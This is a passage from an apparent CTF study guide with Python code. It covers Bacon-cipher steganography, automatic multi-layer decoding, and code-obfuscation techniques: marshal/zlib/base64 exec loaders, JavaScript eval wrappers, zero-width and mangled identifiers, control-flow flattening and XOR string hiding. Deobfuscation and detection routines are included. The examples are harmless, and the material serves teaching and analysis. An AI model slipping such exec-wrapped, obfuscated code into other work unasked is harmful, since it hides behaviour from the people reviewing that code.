    if len(cover_text) < len(bacon):
        raise ValueError("Cover text too short")
    
    encoded_text = []
    bacon_index = 0
    
    for char in cover_text:
        if not char.isalpha():
            encoded_text.append(char)
            continue
        
        if bacon_index < len(bacon):
            if bacon[bacon_index] == 'A':
                encoded_text.append(char.lower())
            else:  # 'B'
                encoded_text.append(char.upper())
            bacon_index += 1
        else:
            encoded_text.append(char)
    
    return ''.join(encoded_text)

def bacon_steganography_decode(encoded_text, variant='modern'):
    """
    Decode Bacon cipher from steganographic text
    Extracts A/B pattern from case
    """
    pattern = []
    
    for char in encoded_text:
        if char.isalpha():
            if char.islower():
                pattern.append('A')
            else:
                pattern.append('B')
    
    bacon_string = ''.join(pattern)
    return bacon_decode(bacon_string, variant)

# Example
message = "HIDE"
cover = "the quick brown fox jumps over the lazy dog and runs away"
stego = bacon_steganography_encode(message, cover)
recovered = bacon_steganography_decode(stego)

print(f"Message: {message}")
print(f"Cover: {cover}")
print(f"Stego: {stego}")
print(f"Recovered: {recovered}")
```

**Bacon Cipher Variants:**

```python
def bacon_variants():
    """
    Different representations of Bacon cipher
    """
    text = "CTF"
    bacon = bacon_encode(text)
    
    variants = {
        'Standard (A/B)': bacon,
        'Binary (0/1)': bacon.replace('A', '0').replace('B', '1'),
        'Dots/Dashes': bacon.replace('A', '.').replace('B', '-'),
        'Visual (○/●)': bacon.replace('A', '○').replace('B', '●'),
        'Case (a/A)': bacon.replace('A', 'a').replace('B', 'A'),
        'Typography': bacon.replace('A', 'normal').replace('B', 'BOLD'),
    }
    
    print(f"Text: {text}\n")
    for name, encoded in variants.items():
        print(f"{name:20s}: {encoded}")

bacon_variants()
```

**Bacon Cipher Detection:**

```python
def detect_bacon_cipher(text):
    """
    Detect if text contains Bacon cipher
    [Inference] Based on patterns and structure
    """
    indicators = []
    confidence = 0
    
    # Remove spaces and normalize
    cleaned = text.replace(' ', '').upper()
    
    # Check for A/B only
    if set(cleaned).issubset({'A', 'B'}):
        indicators.append("Contains only A and B")
        confidence += 30
    
    # Check for binary
    if set(cleaned).issubset({'0', '1'}):
        indicators.append("Binary format (could be Bacon)")
        confidence += 20
    
    # Check length (multiple of 5)
    if len(cleaned) % 5 == 0:
        indicators.append(f"Length ({len(cleaned)}) is multiple of 5")
        confidence += 30
    
    # Check for steganographic pattern
    if text != text.lower() and text != text.upper():
        # Mixed case
        case_pattern = ''.join('B' if c.isupper() else 'A' for c in text if c.isalpha())
        if len(case_pattern) % 5 == 0 and len(case_pattern) >= 5:
            indicators.append("Mixed case pattern (steganographic Bacon)")
            confidence += 40
    
    # Try decoding
    try:
        if len(cleaned) >= 5 and len(cleaned) % 5 == 0:
            decoded = bacon_decode(cleaned)
            if decoded and decoded != '?' * len(decoded):
                indicators.append(f"Successfully decodes to: {decoded[:20]}")
                confidence += 30
    except:
        pass
    
    return {
        'is_bacon': confidence >= 40,
        'confidence': min(confidence, 100),
        'indicators': indicators
    }

# Test detection
test_cases = [
    "AABBBAABAABABBBAABAABABBAA",
    "00111001000111100100101100",
    "ThE qUIcK BrOWn FoX",
    "HELLO WORLD",
]

print("Bacon cipher detection:")
for test in test_cases:
    result = detect_bacon_cipher(test)
    status = "✓" if result['is_bacon'] else "✗"
    print(f"\n{status} '{test[:40]}'")
    print(f"   Confidence: {result['confidence']}%")
    for indicator in result['indicators']:
        print(f"   - {indicator}")
```

**Complete Encoding Chain Analyzer:**

```python
def analyze_encoding_chain(data):
    """
    Analyze and attempt to decode multi-layer encoding
    [Inference] Tries multiple encoding schemes automatically
    """
    if isinstance(data, bytes):
        data = data.decode('ascii', errors='ignore')
    
    results = {
        'original': data,
        'detected_encodings': [],
        'decode_attempts': []
    }
    
    # Detect all possible encodings
    checks = [
        ('Base64', detect_base_encoding),
        ('URL Encoding', lambda d: [{'encoding': 'URL', 'confidence': 'HIGH'}] if '%' in d else []),
        ('Hex', lambda d: [{'encoding': 'Hex', 'confidence': 'HIGH'}] if re.match(r'^[0-9A-Fa-f\s]+$', d.replace('0x', '')) else []),
        ('Morse', identify_morse_code),
        ('Bacon', detect_bacon_cipher),
    ]
    
    for name, detector in checks:
        try:
            result = detector(data)
            if result:
                if isinstance(result, list):
                    results['detected_encodings'].extend(result)
                elif isinstance(result, dict):
                    if result.get('is_morse') or result.get('is_bacon'):
                        results['detected_encodings'].append({
                            'encoding': name,
                            'confidence': f"{result.get('confidence', 0)}%"
                        })
        except:
            continue
    
    # Try decoding with each detected encoding
    for detection in results['detected_encodings']:
        encoding = detection.get('encoding', '')
        
        try:
            decoded = None
            
            if 'Base64' in encoding:
                decoded = base64.b64decode(data)
            elif encoding == 'URL':
                decoded = unquote(data)
            elif encoding == 'Hex':
                cleaned = data.replace(' ', '').replace('0x', '')
                decoded = bytes.fromhex(cleaned)
            elif encoding == 'Morse':
                decoded = morse_decode(data)
            elif encoding == 'Bacon':
                decoded = bacon_decode(data)
            
            if decoded:
                results['decode_attempts'].append({
                    'encoding': encoding,
                    'result': decoded[:100] if isinstance(decoded, (str, bytes)) else str(decoded)[:100]
                })
        except Exception as e:
            results['decode_attempts'].append({
                'encoding': encoding,
                'result': f"Error: {str(e)[:50]}"
            })
    
    return results

# Example
test_data = base64.b64encode(b"FLAG{hidden_message}").decode()
analysis = analyze_encoding_chain(test_data)

print("Encoding Analysis:")
print(f"Original: {analysis['original'][:60]}\n")

print("Detected Encodings:")
for enc in analysis['detected_encodings']:
    print(f"  - {enc['encoding']}: {enc.get('confidence', 'N/A')}")

print("\nDecode Attempts:")
for attempt in analysis['decode_attempts']:
    print(f"  [{attempt['encoding']}] {attempt['result']}")
```

**CTF Encoding Toolkit:**

```python
class EncodingToolkit:
    """
    Comprehensive encoding toolkit for CTF challenges
    """
    
    def __init__(self):
        self.decode_functions = {
            'base64': base64.b64decode,
            'base32': base64.b32decode,
            'base16': base64.b16decode,
            'hex': bytes.fromhex,
            'url': unquote,
            'morse': morse_decode,
            'bacon': bacon_decode,
        }
    
    def auto_decode(self, data, max_iterations=10):
        """
        Automatically detect and decode multiple layers
        """
        current = data
        decode_path = []
        iteration = 0
        
        while iteration < max_iterations:
            # Convert bytes to string if needed
            if isinstance(current, bytes):
                try:
                    current = current.decode('ascii')
                except:
                    break
            
            # Detect encoding
            detected = self.detect_encoding(current)
            
            if not detected:
                break
            
            # Try decoding
            success = False
            for encoding_name in detected:
                try:
                    if encoding_name == 'hex':
                        cleaned = current.replace(' ', '').replace('0x', '')
                        decoded = bytes.fromhex(cleaned)
                    elif encoding_name in self.decode_functions:
                        decoder = self.decode_functions[encoding_name]
                        decoded = decoder(current)
                    else:
                        continue
                    
                    if decoded != current and decoded != current.encode():
                        decode_path.append(encoding_name)
                        current = decoded
                        iteration += 1
                        success = True
                        break
                except:
                    continue
            
            if not success:
                break
        
        return {
            'result': current,
            'path': decode_path,
            'iterations': iteration
        }
    
    def detect_encoding(self, data):
        """Simple encoding detection"""
        encodings = []
        
        if isinstance(data, bytes):
            data = data.decode('ascii', errors='ignore')
        
        # Base64
        if re.match(r'^[A-Za-z0-9+/]*={0,2}$', data) and len(data) % 4 == 0:
            encodings.append('base64')
        
        # Hex
        if re.match(r'^[0-9A-Fa-f\s]+$', data.replace('0x', '')):
            encodings.append('hex')
        
        # URL
        if '%' in data:
            encodings.append('url')
        
        # Morse
        if set(data.replace(' ', '')).issubset({'.', '-', '/'}):
            encodings.append('morse')
        
        # Bacon
        if set(data.replace(' ', '')).issubset({'A', 'B'}):
            encodings.append('bacon')
        
        return encodings

# Example usage
toolkit = EncodingToolkit()

# Multi-layer encoded data
original = b"FLAG{multi_layer}"
layer1 = base64.b64encode(original)
layer2 = layer1.hex()
layer3 = base64.b64encode(layer2)

print(f"Encoded (3 layers): {layer3}\n")

result = toolkit.auto_decode(layer3)
print(f"Decode path: {' -> '.join(result['path'])}")
print(f"Iterations: {result['iterations']}")
print(f"Final result: {result['result']}")
```

---

**Key Takeaways for CTF:**

1. **Encoding Recognition:**
    
    - Base64: `=` padding, A-Za-z0-9+/
    - Hex: 0-9A-F, even length
    - URL: `%XX` format
    - Morse: dots and dashes
    - Bacon: 5-bit groups (AAAAA-BABBB)
2. **Multiple Layers:**
    
    - Always try recursive decoding
    - Common patterns: Base64 → Hex → Base64
    - Use automated tools for deep nesting
3. **Variants and Edge Cases:**
    
    - Base64 without padding
    - URL encoding with mixed case
    - Morse with different separators
    - Bacon steganography in text case
4. **Quick Decision Matrix:**
    
    - `=` at end → Base64/Base32
    - `%` symbols → URL encoding
    - Only hex chars → Hex/Base16
    - Dots/dashes → Morse code
    - Mixed case text → Possible Bacon steganography
5. **CTF-Specific Tips:**
    
    - Check for reversed encodings
    - Look for custom alphabets
    - Try both decode directions
    - Combine with cipher analysis if decoding fails

---

## Obfuscation Methods in CTF Exploitation

### Source Code Obfuscation

**Python Code Obfuscation Techniques**

```python
import base64
import zlib
import marshal
import ast

def obfuscate_python_basic(code):
    """
    Basic Python obfuscation using encoding layers
    
    [Inference: Simple obfuscation, easily reversible]
    """
    # Compile to bytecode
    compiled = compile(code, '<string>', 'exec')
    
    # Marshal and encode
    marshaled = marshal.dumps(compiled)
    compressed = zlib.compress(marshaled)
    encoded = base64.b64encode(compressed)
    
    obfuscated = f"""
import base64, zlib, marshal
exec(marshal.loads(zlib.decompress(base64.b64decode({encoded!r}))))
"""
    
    return obfuscated

# Example
original_code = """
password = "secret123"
if input("Enter password: ") == password:
    print("Access granted")
else:
    print("Access denied")
"""

obfuscated = obfuscate_python_basic(original_code)
print("=== Obfuscated Python Code ===")
print(obfuscated)
```

**Multi-Layer Obfuscation**

```python
def obfuscate_multilayer(code, layers=3):
    """
    Apply multiple layers of obfuscation
    Each layer adds base64 + zlib encoding
    """
    current = code
    
    for layer in range(layers):
        compressed = zlib.compress(current.encode())
        encoded = base64.b64encode(compressed)
        
        current = f"""
import base64, zlib
exec(zlib.decompress(base64.b64decode({encoded!r})).decode())
"""
    
    return current

# Example usage
simple_code = "print('Hello, World!')"
multi_obfuscated = obfuscate_multilayer(simple_code, layers=3)
print("=== Multi-Layer Obfuscated ===")
print(multi_obfuscated[:200] + "...")
```

**Lambda Obfuscation**

```python
def obfuscate_with_lambdas(code):
    """
    Obfuscate using lambda functions and functional programming
    
    [Inference: Makes code harder to read but doesn't hide logic completely]
    """
    # Convert simple operations to lambda expressions
    obfuscated = f"""
(lambda _exec, _code: _exec(_code))(
    (lambda: exec)(),
    {code!r}
)
"""
    return obfuscated

# Example
code = "print('Flag: CTF{example}')"
lambda_obfuscated = obfuscate_with_lambdas(code)
print("=== Lambda Obfuscated ===")
print(lambda_obfuscated)
```

**JavaScript Obfuscation**

```python
def obfuscate_javascript_basic(js_code):
    """
    Basic JavaScript obfuscation using various encoding techniques
    
    [Unverified: Example demonstrates concept; production obfuscators are more sophisticated]
    """
    import base64
    
    # Hex encoding
    hex_encoded = ''.join(f'\\x{ord(c):02x}' for c in js_code)
    
    obfuscated = f"""
eval(unescape('{hex_encoded}'))
"""
    
    # Alternative: Character code array
    char_codes = ','.join(str(ord(c)) for c in js_code)
    
    obfuscated_array = f"""
eval(String.fromCharCode({char_codes}))
"""
    
    return {
        'hex_encoding': obfuscated,
        'char_array': obfuscated_array
    }

# Example
js_code = "console.log('Secret flag: CTF{hidden}');"
js_obfuscated = obfuscate_javascript_basic(js_code)

print("=== JavaScript Hex Encoding ===")
print(js_obfuscated['hex_encoding'][:100] + "...")

print("\n=== JavaScript Char Array ===")
print(js_obfuscated['char_array'][:100] + "...")
```

**De-obfuscation Tools**

```python
def deobfuscate_python_basic(obfuscated_code):
    """
    Attempt to deobfuscate basic Python obfuscation
    
    [Inference: Works on simple base64/zlib patterns]
    """
    import re
    
    print("=== Attempting Deobfuscation ===\n")
    
    # Pattern 1: base64.b64decode pattern
    pattern1 = r"base64\.b64decode\((['\"])([^'\"]+)\1\)"
    matches = re.findall(pattern1, obfuscated_code)
    
    if matches:
        for quote, encoded in matches:
            try:
                decoded = base64.b64decode(encoded)
                print(f"Found base64 encoded data:")
                print(f"Decoded (raw): {decoded[:100]}...")
                
                # Try to decompress
                try:
                    decompressed = zlib.decompress(decoded)
                    print(f"Decompressed: {decompressed[:200]}...")
                    
                    # Try to unmarshal
                    try:
                        unmarshaled = marshal.loads(decompressed)
                        print(f"Type after unmarshal: {type(unmarshaled)}")
                    except:
                        pass
                except:
                    pass
                    
            except Exception as e:
                print(f"Error decoding: {e}")
    
    # Pattern 2: exec with string
    pattern2 = r"exec\(['\"](.+?)['\"]\)"
    exec_matches = re.findall(pattern2, obfuscated_code)
    
    if exec_matches:
        print(f"\nFound exec statements: {len(exec_matches)}")
        for match in exec_matches[:3]:
            print(f"  {match[:50]}...")

# Test deobfuscation
code = "print('Hidden message')"
obf = obfuscate_python_basic(code)
deobfuscate_python_basic(obf)
```

### Variable Name Mangling

**Identifier Mangling**

```python
import random
import string
import re

def generate_mangled_name(index, style='hex'):
    """
    Generate obfuscated variable names
    """
    if style == 'hex':
        return f"_{hex(index)[2:].upper()}"
    elif style == 'random':
        length = random.randint(10, 20)
        chars = string.ascii_lowercase + '_'
        return ''.join(random.choice(chars) for _ in range(length))
    elif style == 'unicode':
        # Use zero-width characters (invisible)
        invisible = ['\u200b', '\u200c', '\u200d', '\u2060']
        return 'var' + ''.join(random.choice(invisible) for _ in range(5))
    elif style == 'confusing':
        # Use similar-looking characters
        return random.choice(['l1l1l', 'O0O0O', 'rn_m', 'vv_w'])
    else:
        return f"var_{index}"

def mangle_variable_names(code):
    """
    Replace all variable names with mangled versions
    
    [Inference: Preserves functionality while reducing readability]
    """
    # Parse code to AST
    try:
        tree = ast.parse(code)
    except SyntaxError:
        return None
    
    # Collect all names
    names = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Name):
            names.add(node.id)
        elif isinstance(node, ast.FunctionDef):
            names.add(node.name)
    
    # Filter out built-ins and keywords
    import keyword
    builtins_list = dir(__builtins__)
    names = {n for n in names if n not in keyword.kwlist and n not in builtins_list}
    
    # Create mapping
    name_mapping = {}
    for i, name in enumerate(sorted(names)):
        name_mapping[name] = generate_mangled_name(i, style='hex')
    
    # Replace in code
    mangled_code = code
    for old_name, new_name in sorted(name_mapping.items(), key=lambda x: len(x[0]), reverse=True):
        # Use word boundaries to avoid partial replacements
        mangled_code = re.sub(r'\b' + re.escape(old_name) + r'\b', new_name, mangled_code)
    
    return {
        'code': mangled_code,
        'mapping': name_mapping
    }

# Example usage
original = """
def check_password(user_input):
    secret_password = "CTF{flag_here}"
    if user_input == secret_password:
        return True
    return False

user_guess = input("Enter password: ")
result = check_password(user_guess)
print(result)
"""

mangled = mangle_variable_names(original)
if mangled:
    print("=== Original Code ===")
    print(original)
    print("\n=== Mangled Code ===")
    print(mangled['code'])
    print("\n=== Name Mapping ===")
    for old, new in mangled['mapping'].items():
        print(f"  {old:20} -> {new}")
```

**Advanced Variable Mangling**

```python
def mangle_with_encoding(code):
    """
    Mangle variables and encode their values
    """
    mangled = mangle_variable_names(code)
    if not mangled:
        return None
    
    mangled_code = mangled['code']
    
    # Further obfuscate string literals
    def encode_string(s):
        # Convert to hex array
        hex_array = ','.join(f"0x{ord(c):02x}" for c in s)
        return f"''.join(chr(c) for c in [{hex_array}])"
    
    # Find string literals
    string_pattern = r"(['\"])([^'\"]+)\1"
    
    def replace_string(match):
        quote = match.group(1)
        content = match.group(2)
        if len(content) > 3:  # Only encode longer strings
            return encode_string(content)
        return match.group(0)
    
    encoded_code = re.sub(string_pattern, replace_string, mangled_code)
    
    return encoded_code

# Example
code = """
password = "secret123"
flag = "CTF{example_flag}"
"""

encoded = mangle_with_encoding(code)
if encoded:
    print("=== Heavily Mangled Code ===")
    print(encoded)
```

**De-mangling Techniques**

```python
def analyze_mangled_code(code):
    """
    Analyze obfuscated code to identify patterns
    
    [Inference: Helps understand obfuscation technique used]
    """
    print("=== Code Analysis ===\n")
    
    # Count variable types
    hex_vars = len(re.findall(r'\b_[0-9A-F]+\b', code))
    long_vars = len(re.findall(r'\b[a-z_]{15,}\b', code))
    confusing_vars = len(re.findall(r'\b[l1O0rn_m]+\b', code))
    
    print(f"Hex-style variables: {hex_vars}")
    print(f"Long random variables: {long_vars}")
    print(f"Confusing variables: {confusing_vars}")
    
    # Detect encoding patterns
    if 'base64.b64decode' in code:
        print("\n[Detection] Base64 encoding used")
    if 'zlib.decompress' in code:
        print("[Detection] Zlib compression used")
    if 'marshal.loads' in code:
        print("[Detection] Marshal serialization used")
    if 'exec(' in code or 'eval(' in code:
        print("[Detection] Dynamic execution used")
    
    # String encoding detection
    if 'chr(' in code and '[' in code:
        print("[Detection] Character array encoding detected")
        
    # Extract potential encoded data
    base64_pattern = r"b64decode\(['\"]([A-Za-z0-9+/=]+)['\"]\)"
    encoded_data = re.findall(base64_pattern, code)
    
    if encoded_data:
        print(f"\n[Found] {len(encoded_data)} base64 encoded blocks")
        for i, data in enumerate(encoded_data[:3], 1):
            print(f"  Block {i}: {data[:50]}...")

# Test
obf_code = obfuscate_python_basic("password = 'secret'")
analyze_mangled_code(obf_code)
```

### Control Flow Obfuscation

**Opaque Predicates**

```python
def add_opaque_predicates(code):
    """
    Add opaque predicates - conditions that always evaluate to True/False
    but are hard to analyze statically
    
    [Inference: Increases complexity without changing functionality]
    """
    # Examples of opaque predicates
    opaque_true = [
        "(lambda x: x*x >= 0)(5)",  # Always True
        "(2**10 == 1024)",
        "(len('test') == 4)",
        "((lambda: True)())",
    ]
    
    opaque_false = [
        "(lambda x: x != x)(42)",  # Always False
        "(5 < 3)",
        "('' == 'x')",
    ]
    
    lines = code.split('\n')
    obfuscated_lines = []
    
    for line in lines:
        # Add random opaque predicate before some lines
        if line.strip() and not line.strip().startswith('#') and random.random() < 0.3:
            predicate = random.choice(opaque_true)
            obfuscated_lines.append(f"if {predicate}:")
            obfuscated_lines.append(f"    {line}")
        else:
            obfuscated_lines.append(line)
    
    return '\n'.join(obfuscated_lines)

# Example
simple_code = """
x = 10
y = 20
print(x + y)
"""

with_predicates = add_opaque_predicates(simple_code)
print("=== Code with Opaque Predicates ===")
print(with_predicates)
```

**Control Flow Flattening**

```python
def flatten_control_flow(code):
    """
    Convert linear code into switch-case based control flow
    
    [Inference: Makes static analysis more difficult by obscuring execution order]
    """
    lines = [l.strip() for l in code.split('\n') if l.strip() and not l.startswith('#')]
    
    # Create dispatcher-based control flow
    flattened = """
_state = 0
while True:
"""
    
    for i, line in enumerate(lines):
        flattened += f"""    if _state == {i}:
        {line}
        _state = {i + 1}
"""
    
    flattened += f"""    elif _state == {len(lines)}:
        break
"""
    
    return flattened

# Example
linear_code = """
password = input("Enter password: ")
correct = "secret123"
if password == correct:
    print("Access granted")
else:
    print("Access denied")
"""

flattened = flatten_control_flow(linear_code)
print("=== Flattened Control Flow ===")
print(flattened)
```

**Jump Table Obfuscation**

```python
def create_jump_table_obfuscation(statements):
    """
    Create a jump table to obfuscate execution order
    
    Args:
        statements: list of code statements
    
    [Inference: Execution order determined at runtime through table lookup]
    """
    import random
    
    # Create random execution order
    num_statements = len(statements)
    order = list(range(num_statements))
    random.shuffle(order)
    
    # Create jump table
    jump_table = {}
    for i in range(num_statements):
        current_idx = order[i]
        next_idx = order[i + 1] if i + 1 < num_statements else -1
        jump_table[current_idx] = (statements[current_idx], next_idx)
    
    # Generate obfuscated code
    code = f"""
_jump_table = {jump_table!r}
_current = {order[0]}

while _current != -1:
    _stmt, _next = _jump_table[_current]
    exec(_stmt)
    _current = _next
"""
    
    return code

# Example
statements = [
    "x = 10",
    "y = 20",
    "z = x + y",
    "print(f'Result: {z}')"
]

jump_obfuscated = create_jump_table_obfuscation(statements)
print("=== Jump Table Obfuscated ===")
print(jump_obfuscated)
```

**Exception-Based Control Flow**

```python
def obfuscate_with_exceptions(code):
    """
    Use exception handling for control flow obfuscation
    
    [Inference: Unconventional control flow pattern]
    """
    lines = [l.strip() for l in code.split('\n') if l.strip()]
    
    obfuscated = """
class _FlowControl(Exception):
    def __init__(self, next_step):
        self.next_step = next_step

_step = 0
while _step >= 0:
    try:
"""
    
    for i, line in enumerate(lines):
        obfuscated += f"""        if _step == {i}:
            {line}
            raise _FlowControl({i + 1})
"""
    
    obfuscated += f"""        if _step >= {len(lines)}:
            raise _FlowControl(-1)
    except _FlowControl as e:
        _step = e.next_step
"""
    
    return obfuscated

# Example
code = """
a = 5
b = 10
c = a * b
print(c)
"""

exception_obfuscated = obfuscate_with_exceptions(code)
print("=== Exception-Based Control Flow ===")
print(exception_obfuscated)
```

**De-obfuscating Control Flow**

```python
def analyze_control_flow(code):
    """
    Analyze and attempt to reconstruct original control flow
    
    [Inference: Identifies obfuscation patterns]
    """
    print("=== Control Flow Analysis ===\n")
    
    # Detect state machines
    if '_state' in code and 'while' in code:
        print("[Detection] State machine pattern detected")
        
        # Extract states
        state_pattern = r'if _state == (\d+):'
        states = re.findall(state_pattern, code)
        print(f"  Found {len(states)} states")
    
    # Detect jump tables
    if '_jump_table' in code:
        print("[Detection] Jump table pattern detected")
        
        # Try to extract jump table
        table_pattern = r'_jump_table = ({.*?})'
        match = re.search(table_pattern, code, re.DOTALL)
        if match:
            try:
                jump_table = eval(match.group(1))
                print(f"  Jump table entries: {len(jump_table)}")
                
                # Reconstruct order
                print("\n  Reconstructed execution order:")
                current = 0
                visited = set()
                step = 0
                
                while current != -1 and current not in visited:
                    if current in jump_table:
                        stmt, next_idx = jump_table[current]
                        print(f"    Step {step}: {stmt}")
                        visited.add(current)
                        current = next_idx
                        step += 1
                    else:
                        break
            except:
                print("  Could not parse jump table")
    
    # Detect exception-based control flow
    if 'class _FlowControl(Exception)' in code:
        print("[Detection] Exception-based control flow detected")
    
    # Detect opaque predicates
    opaque_patterns = [
        r'\(lambda x: x\*x >= 0\)',
        r'\(2\*\*10 == 1024\)',
        r'\(lambda x: x != x\)',
    ]
    
    opaque_count = sum(len(re.findall(pattern, code)) for pattern in opaque_patterns)
    if opaque_count > 0:
        print(f"[Detection] {opaque_count} opaque predicates detected")

# Test
obf = flatten_control_flow("x=1\ny=2\nprint(x+y)")
analyze_control_flow(obf)
```

### String Obfuscation

**XOR String Encoding**

```python
def xor_encode_string(plaintext, key=0x42):
    """
    XOR encode a string with a single-byte key
    """
    encoded = bytes([b ^ key for b in plaintext.encode()])
    return encoded

def xor_decode_string(encoded, key=0x42):
    """
    XOR decode a string
    """
    decoded = bytes([b ^ key for b in encoded])
    return decoded.decode()

def obfuscate_strings_xor(code, key=0x42):
    """
    Replace all string literals with XOR-encoded versions
    """
    def replace_string(match):
        quote = match.group(1)
        content = match.group(2)
        
        # Encode string
        encoded = xor_encode_string(content, key)
        hex_encoded = encoded.hex()
        
        # Generate decoder
        return f"bytes.fromhex('{hex_encoded}').decode('latin1').translate(str.maketrans({{chr(i):chr(i^{key}) for i in range(256)}}))"
    
    # More accurate replacement
    obfuscated = code
    string_pattern = r"(['\"])([^'\"\\]*(?:\\.[^'\"\\]*)*)\1"
    
    matches = list(re.finditer(string_pattern, code))
    offset = 0
    
    for match in matches:
        quote = match.group(1)
        content = match.group(2)
        
        if len(content) > 2:  # Only obfuscate longer strings
            encoded = xor_encode_string(content, key)
            replacement = f"''.join(chr(c^{key}) for c in bytes.fromhex('{encoded.hex()}'))"
            
            start = match.start() + offset
            end = match.end() + offset
            obfuscated = obfuscated[:start] + replacement + obfuscated[end:]
            offset += len(replacement) - (end - start)
    
    return obfuscated

# Example
code_with_strings = """
password = "secret123"
flag = "CTF{hidden_flag}"
print(f"The password is {password}")
"""

xor_obfuscated = obfuscate_strings_xor(code_with_strings, key=0x55)
print("=== XOR String Obfuscation ===")
print(xor_obfuscated)
```

**Base64 String Encoding**

```python
def obfuscate_strings_base64(code):
    """
    Encode all strings using base64
    """
    def replace_string(match):
        quote = match.group(1)
        content = match.group(2)
        
        if len(content) > 2:
            encoded = base64.b64encode(content.encode()).decode()
            return f"__import__('base64').b64decode('{encoded}').decode()"
        return match.group(0)
    
    string_pattern = r"(['\"])([^'\"]+)\1"
    obfuscated = re.sub(string_pattern, replace_string, code)
    
    return obfuscated

# Example
print("\n=== Base64 String Obfuscation ===")
print(obfuscate_strings_base64(code_with_strings))
```

**ROT13/Caesar Cipher String Encoding**

```python
def rot_encode(text, shift=13):
    """
    ROT-N encoding for strings
    """
    result = []
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result.append(chr((ord(char) - base + shift) % 26 + base))
        else:
            result.append(char)
    return ''.join(result)

def obfuscate_strings_rot(code, shift=13):
    """
    Encode strings using ROT-N cipher
    """
    def replace_string(match):
        quote = match.group(1)
        content = match.group(2)
        
        if len(content) > 2 and content.isalpha():
            encoded = rot_encode(content, shift)
            # Generate inline decoder
            decoder = f"''.join(chr((ord(c)-({'65' if 'c.isupper()' else '97'})+{26-shift})%26+({'65' if 'c.isupper()' else '97'})) if c.isalpha() else c for c in '{encoded}')"
            return decoder
        return match.group(0)
    
    string_pattern = r"(['\"])([^'\"]+)\1"
    obfuscated = re.sub(string_pattern, replace_string, code)
    
    return obfuscated

# Example
print("\n=== ROT13 String Obfuscation ===")
simple_code = "password = 'SECRET'"
print(obfuscate_strings_rot(simple_code))
```

**Character Code Array Encoding**

```python
def obfuscate_strings_charcode(code):
    """
    Replace strings with character code arrays
    """
    def replace_string(match):
        quote = match.group(1)
        content = match.group(2)
        
        if len(content) > 2:
            char_codes = ','.join(str(ord(c)) for c in content)
            return f"''.join(chr(c) for c in [{char_codes}])"
        return match.group(0)
    
    string_pattern = r"(['\"])([^'\"]+)\1"
    obfuscated = re.sub(string_pattern, replace_string, code)
    
    return obfuscated

# Example
print("\n=== Character Code Array Obfuscation ===")
print(obfuscate_strings_charcode(code_with_strings))
```

**Multi-Layer String Obfuscation**

```python
def obfuscate_strings_multilayer(code, layers=['xor', 'base64', 'reverse']):
    """
    Apply multiple layers of string obfuscation
    
    [Inference: Each layer increases deobfuscation complexity]
    """
    current = code
    
    for layer in layers:
        if layer == 'xor':
            current = obfuscate_strings_xor(current, key=random.randint(1, 255))
        elif layer == 'base64':
            current = obfuscate_strings_base64(current)
        elif layer == 'reverse':
            # Reverse string encoding
            def reverse_replace(match):
                content = match.group(2)
                if len(content) > 2:
                    reversed_str = content[::-1]
                    return f"'{reversed_str}'[::-1]"
                return match.group(0)
            
            pattern = r"(['\"])([^'\"]+)\1"
            current = re.sub(pattern, reverse_replace, current)
        elif layer == 'hex':
            def hex_replace(match):
                content = match.group(2)
                if len(content) > 2:
                    hex_str = content.encode().hex()
                    return f"bytes.fromhex('{hex_str}').decode()"
                return match.group(0)
            
            pattern = r"(['\"])([^'\"]+)\1"
            current = re.sub(pattern, hex_replace, current)
    
    return current

# Example
print("\n=== Multi-Layer String Obfuscation ===")
multi_obf = obfuscate_strings_multilayer("flag = 'CTF{example}'", layers=['reverse', 'hex'])
print(multi_obf)
```

**String De-obfuscation Framework**

```python
def deobfuscate_strings(code):
    """
    Attempt to deobfuscate various string encoding methods
    
    [Inference: Pattern matching for common obfuscation techniques]
    """
    print("=== String Deobfuscation Analysis ===\n")
    
    findings = []
    
    # Detect base64 encoded strings
    base64_pattern = r"base64\.b64decode\(['\"]([A-Za-z0-9+/=]+)['\"]\)"
    base64_matches = re.findall(base64_pattern, code)
    
    if base64_matches:
        print(f"[Found] {len(base64_matches)} base64 encoded strings:")
        for encoded in base64_matches[:5]:
            try:
                decoded = base64.b64decode(encoded).decode()
                print(f"  '{encoded[:30]}...' -> '{decoded}'")
                findings.append(decoded)
            except:
                print(f"  '{encoded[:30]}...' -> [decode error]")
    
    # Detect hex encoded strings
    hex_pattern = r"bytes\.fromhex\(['\"]([0-9a-fA-F]+)['\"]\)"
    hex_matches = re.findall(hex_pattern, code)
    
    if hex_matches:
        print(f"\n[Found] {len(hex_matches)} hex encoded strings:")
        for encoded in hex_matches[:5]:
            try:
                decoded = bytes.fromhex(encoded).decode()
                print(f"  '{encoded[:30]}...' -> '{decoded}'")
                findings.append(decoded)
            except:
                print(f"  '{encoded[:30]}...' -> [decode error]")
    
    # Detect XOR patterns
    xor_pattern = r"chr\(c\^(\d+)\)"
    xor_matches = re.findall(xor_pattern, code)
    
    if xor_matches:
        print(f"\n[Found] XOR encoding with keys: {set(xor_matches)}")
    
    # Detect character arrays
    chararray_pattern = r"\[(\d+(?:,\d+)+)\]"
    chararray_matches = re.findall(chararray_pattern, code)
    
    if chararray_matches:
        print(f"\n[Found] {len(chararray_matches)} character arrays:")
        for arr_str in chararray_matches[:3]:
            try:
                char_codes = [int(x) for x in arr_str.split(',')]
                if all(32 <= c <= 126 for c in char_codes):  # Printable ASCII
                    decoded = ''.join(chr(c) for c in char_codes)
                    print(f"  [{arr_str[:50]}...] -> '{decoded}'")
                    findings.append(decoded)
            except:
                pass
    
    # Detect reversed strings
    if "[::-1]" in code:
        print("\n[Found] String reversal detected")
    
    print(f"\n=== Summary ===")
    print(f"Total decoded strings: {len(findings)}")
    
    # Check for flags
    flag_pattern = r'CTF\{[^}]+\}'
    flags = [f for f in findings if re.search(flag_pattern, f)]
    
    if flags:
        print(f"\n[!!!] FOUND FLAGS: {len(flags)}")
        for flag in flags:
            print(f"  {flag}")
    
    return findings

# Test deobfuscation
test_obfuscated = """
s1 = __import__('base64').b64decode('Q1RGe2V4YW1wbGVfZmxhZ30=').decode()
s2 = bytes.fromhex('7365637265745f706173737764').decode()
s3 = ''.join(chr(c) for c in [72,101,108,108,111])
s4 = 'gnalf'[::-1]
"""

deobfuscate_strings(test_obfuscated)
```

**String Encryption with Key**

```python
def encrypt_string_aes(plaintext, key):
    """
    Encrypt string using AES (for demonstration)
    
    [Inference: Stronger than simple encoding, requires key recovery]
    """
    from Crypto.Cipher import AES
